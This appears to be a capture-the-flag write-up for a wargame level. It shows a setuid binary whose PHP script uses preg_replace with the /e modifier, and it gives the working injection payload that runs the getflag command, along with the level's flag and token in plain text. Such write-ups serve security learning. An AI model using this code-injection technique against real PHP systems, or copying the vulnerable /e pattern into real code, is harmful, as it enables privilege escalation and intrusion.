## FLAG: `viuaaale9huek52boumoomioc`

> ls -l
```
    total 12
    -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

> cat level06.php
```
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
```
## This script takes up to 2 arguments but only use the first one
## which must be a file `$a = file_get_contents($y);`
## It takes its content and put it through multiple regex
## `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)` can execute some code thanks to `/e`

> echo '[x ${`getflag`}]' > /tmp/06_file && ./level06 /tmp/06_file
```
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1
```